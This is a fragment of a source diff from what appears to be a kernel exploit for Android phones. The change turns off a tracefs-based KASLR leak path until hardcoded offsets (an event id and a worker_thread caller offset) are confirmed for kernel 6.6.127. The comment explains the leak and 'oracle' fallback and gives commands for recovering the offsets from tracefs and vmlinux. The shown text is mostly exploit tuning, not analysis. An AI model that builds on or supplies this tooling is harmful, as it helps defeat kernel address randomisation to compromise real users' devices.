@@ -62,7 +62,18 @@
  */
 #define SLIDE_TRACEFS_EVENT_ID          106   /* TODO: verify */
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db1a0ULL  /* TODO: verify */
-#define APP_TRACEFS_KASLR_DIRECT        1
+/* APP_TRACEFS_KASLR_DIRECT is intentionally disabled until
+ * SLIDE_TRACEFS_EVENT_ID and SLIDE_TRACEFS_WORKER_CALLER_OFF are
+ * confirmed correct for kernel 6.6.127.  The values above are
+ * carried forward from S24 Ultra (kernel 6.1) and using them with
+ * the fast tracefs path on a mismatched kernel produces a silent
+ * mis-leak rather than a clean fallback to the slower oracle path.
+ * Re-enable by uncommenting the line below once both offsets are
+ * verified via:
+ *   grep sched_blocked_reason /sys/kernel/tracing/events/sched/.../id
+ *   nm vmlinux | grep worker_thread
+ */
+/* #define APP_TRACEFS_KASLR_DIRECT        1 */
 
 #define SLIDE_PSELECT_WORD_SHIFT    3
 #define SLIDE_P0_OFFSET_CANDIDATES \
